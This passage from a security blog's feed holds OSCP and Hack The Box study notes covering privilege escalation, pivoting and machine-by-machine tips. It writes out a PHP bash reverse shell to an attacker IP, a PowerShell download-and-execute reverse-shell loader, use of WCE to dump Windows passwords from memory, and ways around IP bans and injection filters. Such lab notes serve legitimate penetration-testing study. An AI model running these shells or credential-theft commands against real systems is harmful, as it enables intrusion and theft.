&lt;p&gt;The hashes can be extracted using &lt;code&gt;secretdump.py&lt;&#x2F;code&gt; or &lt;code&gt;pwdump&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;windows-credencial-editor-wce&quot;&gt;Windows Credencial Editor (WCE)&lt;&#x2F;h3&gt;
&lt;p&gt;WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;wce32.exe -w
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;linux-privilege-escalation&quot;&gt;Linux Privilege Escalation&lt;&#x2F;h2&gt;
&lt;p&gt;Check to see what sudo privileges the current user has:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo -l
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;One-line PHP reverse shell:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;exec(&amp;quot;&#x2F;bin&#x2F;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;10.11.0.219&#x2F;443 0&amp;gt;&amp;amp;1&amp;#39;&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Create a new file within terminal:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;#!&#x2F;bin&#x2F;sh
&lt;&#x2F;span&gt;&lt;span&gt;cat &amp;gt; test &amp;lt;&amp;lt; EOF
&lt;&#x2F;span&gt;&lt;span&gt;Hello World!
&lt;&#x2F;span&gt;&lt;span&gt;This is my stupid text file.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;You
&lt;&#x2F;span&gt;&lt;span&gt;can also
&lt;&#x2F;span&gt;&lt;span&gt;have
&lt;&#x2F;span&gt;&lt;span&gt;a whole lot
&lt;&#x2F;span&gt;&lt;span&gt;more text and
&lt;&#x2F;span&gt;&lt;span&gt;lines
&lt;&#x2F;span&gt;&lt;span&gt;EOF
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Find setgid and setuid binaries:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;find &#x2F; -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;interactive-shell&quot;&gt;Interactive Shell&lt;&#x2F;h2&gt;
&lt;p&gt;Bread and butter interactive shell:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;python -c &amp;quot;import pty; pty.spawn(&#x27;&#x2F;bin&#x2F;bash&#x27;)&amp;quot;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;Ctrl + Z&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;stty raw -echo&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;fg&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;pivoting&quot;&gt;Pivoting&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xdf.gitlab.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;pwk-notes-tunneling-update1.html&quot;&gt;https:&#x2F;&#x2F;0xdf.gitlab.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;pwk-notes-tunneling-update1.html&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;artkond.com&#x2F;2017&#x2F;03&#x2F;23&#x2F;pivoting-guide&#x2F;&quot;&gt;https:&#x2F;&#x2F;artkond.com&#x2F;2017&#x2F;03&#x2F;23&#x2F;pivoting-guide&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.ivoidwarranties.tech&#x2F;posts&#x2F;pentesting-tuts&#x2F;pivoting&#x2F;proxychains&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.ivoidwarranties.tech&#x2F;posts&#x2F;pentesting-tuts&#x2F;pivoting&#x2F;proxychains&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Ippsec Review Notes</title>
        <published>2019-05-24T00:00:00+00:00</published>
        <updated>2019-05-24T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/ippsec/" type="text/html"/>
        <id>https://johntuyen.com/posts/ippsec/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;oscp-htb-labs.jpeg&quot; alt=&quot;OSCP-like HTB Boxes&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;bashed&quot;&gt;Bashed&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Web shells aren&#x27;t persistent. To get a persistent shell, upload or execute a reverse shell script that connects back to an &lt;code&gt;nc&lt;&#x2F;code&gt; session.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;In the &lt;code&gt;linenum.sh&lt;&#x2F;code&gt; script, this output means that user &lt;code&gt;scriptmanager&lt;&#x2F;code&gt; can run &lt;code&gt;sudo&lt;&#x2F;code&gt; without a password and execute anything as &lt;code&gt;scriptmanager&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-bashed-sudo.png&quot; alt=&quot;ippsec-bashed-sudo&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;sense&quot;&gt;Sense&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;This box is interesting because it&#x27;s a real world type machine. If you brute force the login page and fail to login for more than 15 times, it will block your IP for 24 hours. Without knowing this, you can assume the box keeps crashing. What this machine teaches you is just because it bans your IP, you should always verify with another machine if it did ban your IP. Also, to bypass the banned IP, you can proxychain your own machine to another host and resume testing again.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -D1080&lt;&#x2F;span&gt;&lt;span&gt; 10.10.10.74
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vi&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;proxychains
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socks5&lt;&#x2F;span&gt;&lt;span&gt; 127.0.0.1 1080
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;proxychains&lt;&#x2F;span&gt;&lt;span&gt; curl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -k&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;10.10.10.1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;When injecting commands via URL, you sometimes run into issues where certain characters are banned such as dash and slashes. For slashes, you can use the linux environment variable such as HOME because by default it would be empty like this: &lt;code&gt;HOME=&#x2F;&lt;&#x2F;code&gt;. For dash, you can use &lt;code&gt;printf&lt;&#x2F;code&gt; along with the ascii character that can be found using &lt;code&gt;man ascii&lt;&#x2F;code&gt; page.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-sense-url.png&quot; alt=&quot;ippsec-sense-url&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-sense-url2.png&quot; alt=&quot;ippsec-sense-url2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;nibbles&quot;&gt;Nibbles&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Using &lt;code&gt;grep&lt;&#x2F;code&gt; searching for a specific string will lead you with a blob of data with barely readable results.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-nibbles-grep.png&quot; alt=&quot;ippsec-nibbles-grep&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In order to sort this output to a better readable format:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;grep -R&lt;&#x2F;span&gt;&lt;span&gt; 4.0.5 . | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;awk -F&lt;&#x2F;span&gt;&lt;span&gt;: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;{print $1}&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uniq
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-nibbles-awk.png&quot; alt=&quot;ippsec-nibbles-awk&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;When viewing URLs that renders a blank page, always try to view source to see if data is readable. There are cases where files are the non-standard web extensions will show up as blank but the file in included in the web server.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-nibbles-bit.png&quot; alt=&quot;ippsec-nibbles-bit&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;If you don&#x27;t want to use exploits using Metasploit modules, you can read the file to see if there is a reference URL that leads to the original post on how to manually execute the exploit. This is a great way to see how the exploit process works rather than a button press get bacon scenario.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Instead of always using &lt;code&gt;gobuster&lt;&#x2F;code&gt; or &lt;code&gt;dirbuster&lt;&#x2F;code&gt; to search for possible url links, the other method would be downloading the source code of the software platform and see how the file structure is organized.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If you get IP blacklisted due to brute forcing the admin password through the admin control panel, you can use a SSH local port forward feature to bypass this IP restriction. The requirement is having another SSH accessible machine. How SSH local port forward works is:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;It will create a localhost port 9000.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Any data traffic sent to 9000 will be redirected to the SSH tunnel travelling to the remote machine.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The remote machine will then forward the request to the target destination.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Complete command:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -L9000&lt;&#x2F;span&gt;&lt;span&gt;:10.10.10.75:80 10.10.10.73
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Breakdown - Creates localhost port 9000:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -L9000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Breakdown - Forward data using port 80:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -L9000&lt;&#x2F;span&gt;&lt;span&gt;:10.10.10.75:80
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Breakdown - Forwarded data is being sent to remote machine 10.10.10.73&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -L9000&lt;&#x2F;span&gt;&lt;span&gt;:10.10.10.75:80 10.10.10.73
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-nibbles-sshfwd.png&quot; alt=&quot;ippsec-nibbles-sshfwd&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;To check for file type:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span&gt; cmd.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This is good for bypassing file checking.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;-p&lt;&#x2F;code&gt; switch is great for creating a chain of non-existant folder(s)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mkdir -p&lt;&#x2F;span&gt;&lt;span&gt; personal&#x2F;stuff&#x2F;veryprivate. 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;valentine&quot;&gt;Valentine&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;A tool to scan if the https is vulnerable to heartbleed vulnerability.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sslyze&lt;&#x2F;span&gt;&lt;span&gt; –heartbleed 10.10.10.79
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;heartbleed_explanation_2x.png&quot; alt=&quot;heartbleed_explanation_2x&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;For a modern exploit like heartbleed, you may think, how do I begin to find this exploit and test it on a system. First, github will be your main source of finding proof of concept code. Second, find forums such as 0x00 and see if there are brief tutorials on how to execute the PoC. Third, if there is no clear tutorials, read the simple explanation concepts and see if you can read the code to dissect how it works. From there, you can tweak the small parts of the code for the desired outcome.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;An offline way to decode base64 strings:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-n&lt;&#x2F;span&gt;&lt;span&gt; aGVhcnRibGVlZGJlZGJlbGlldmV0aGVoeXBlCg== | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;base64 -d
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Something I wasn&#x27;t aware of is if you have a private .key file, the filename is usually the username.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -i&lt;&#x2F;span&gt;&lt;span&gt; hype.key hype@10.10.10.79
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;If &lt;code&gt;linenum.sh&lt;&#x2F;code&gt; script output doesn&#x27;t show anything obvious, always go back and think about what other simple thing you could do. In this case, you can check out the user home directories for bash history or stored files.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;poison&quot;&gt;Poison&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;honze-net&#x2F;nmap-bootstrap-xsl&quot;&gt;Nmap Bootstrap XSL stylesheet&lt;&#x2F;a&gt; - This is pretty cool to visualize nmap logs using a web browser. Great for reports.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;PHP info File Upload exploit - if phpinfo page shows File Upload is on, you can upload a file and PHP will save the file into a cached directory. PHP server assumes that as long as the file cannot be accessed publicly, there will be no code execution. If you launch an LFI attack, code execution is possible.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-poison-fileupload.png&quot; alt=&quot;ippsec-poison-fileupload&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&quot;&gt;Payload All The Things&lt;&#x2F;a&gt; - A list of useful payloads and bypasses for Web Application Security&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;There will be times where you download a script and when you try to execute it, errors will occur. Instead of instinctively Googling about the error, pause and think about what the error is about.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Does the script fail before it starts attempting to connect to the target server or does it fail during when it attacks the target server?&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If it fails during when it attacks the target server, use a middle man tool such as Burpsuite and use the proxy setting to capture what the script is sending.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The proxy IP address Burpsuite should use is the target server and port. When you run the script, change the IP address to localhost and target port.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If the script is trying to find a specific parameter, why isn&#x27;t it finding it? Typo? Encoding? Syntax? These are the things you need to pay attention when troubleshooting scripts.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Burpsuite results shows up as &lt;code&gt;&amp;amp;gt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-poison-script2.png&quot; alt=&quot;ippsec-poison-script2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Script is looking for &#x27;&amp;gt;&#x27; symbol which resulted a script error.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-poison-script1.png&quot; alt=&quot;ippsec-poison-script1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pen-testing.sans.org&#x2F;blog&#x2F;2015&#x2F;11&#x2F;10&#x2F;protected-using-the-ssh-konami-code-ssh-control-sequences&quot;&gt;SANS SSH Konami Code&lt;&#x2F;a&gt; - Useful for running commands on local machine without terminating a running SSH session and other shortcuts.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Listen on local ports 6801 and 6901, send any traffic through SSH to 127.0.0.1 5801 and 5901.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -L6801&lt;&#x2F;span&gt;&lt;span&gt;:127.0.0.1:5801 L6901:127.0.0.1:5901 charix@10.10.10.84
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;You can also contaminate the &lt;code&gt;httpd-access.log&lt;&#x2F;code&gt; using Burpsuite through &lt;code&gt;User-Agent&lt;&#x2F;code&gt; tag.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;devel&quot;&gt;Devel&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;The “ms##” indicates the year of the patch. For example, ms10 would be 2010. If you see a long sequential list of possible exploits, check what the OS version is and check when it was first released. This piece of information will tell you if this machine has been maintained or not.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-devel-mspatches.png&quot; alt=&quot;ippsec-devel-mspatches&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;In &lt;code&gt;msfconsole&lt;&#x2F;code&gt;, there is a module to suggest an exploit by testing the current open session.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;use&lt;&#x2F;span&gt;&lt;span&gt; post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;optimum&quot;&gt;Optimum&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;If execution of an exploit doesn&#x27;t provide feedback results like in Burpsuite, it&#x27;s a called a blind execution. It&#x27;s difficult to tell if the exploit worked or not. In these type of scenarios, try simple code execution testing such as pinging back to yourself. To know if the remote server is pinging back, you will need to use tcpdump on the listening interface to see the response back. Once you verify the response is valid, you can proceed with trying to reverse shell the machine.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;This Burp request won&#x27;t show results so it&#x27;s hard to know if remote code execution is successful or not: &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-optimum-ping2.png&quot; alt=&quot;ippsec-optimum-ping2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;But using &lt;code&gt;tcpdump&lt;&#x2F;code&gt; on an interface will monitor the ping response to verify the remote code execution is successful. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-optimum-ping1.png&quot; alt=&quot;ippsec-optimum-ping1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang&#x2F;tree&#x2F;master&#x2F;Shells&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang&#x2F;tree&#x2F;master&#x2F;Shells&lt;&#x2F;a&gt; - Great repo for Powershell reverse shell scripts.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Command execution to load Powershell reverse shell:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;c:\Windows\SysNative\WindowsPowershell\v1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;powershell.exe&lt;&#x2F;span&gt;&lt;span&gt; IEX(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;New-Object&lt;&#x2F;span&gt;&lt;span&gt; Net.WebClient).downloadString(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;10.10.10.10:8000&#x2F;Invoke-PowerShellTcp.ps1&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Encoded in Burpsuite:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;ippsec&#x2F;ippsec-optimum-powershell.png&quot; alt=&quot;ippsec-optimum-powershell&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;Sherlock&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;Sherlock&lt;&#x2F;a&gt; - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>OSCP Experience</title>
        <published>2019-05-24T00:00:00+00:00</published>
        <updated>2019-05-24T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
